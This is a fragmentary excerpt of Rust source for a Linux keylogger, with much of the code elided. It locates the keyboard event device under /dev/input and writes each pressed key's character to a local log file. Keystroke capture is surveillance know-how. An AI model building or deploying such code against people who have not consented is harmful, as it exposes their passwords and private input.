 ...
 * keyboard events to stdout until it is stopped externally. It is written
...
const FILE_NAME: &str = "./logged_keyboard_events.txt";

fn main() {
  //Search in `/dev/input/by_path` for anything with "kbd" in it and follow
  //the symlink to the event file
  ...
  */
  ...
  loop {
    ...
    if value == KEY_PRESS && code < MAX_KEYS {
      let character = arr[code as usize];
      write!(output_file, "{}", character).unwrap();
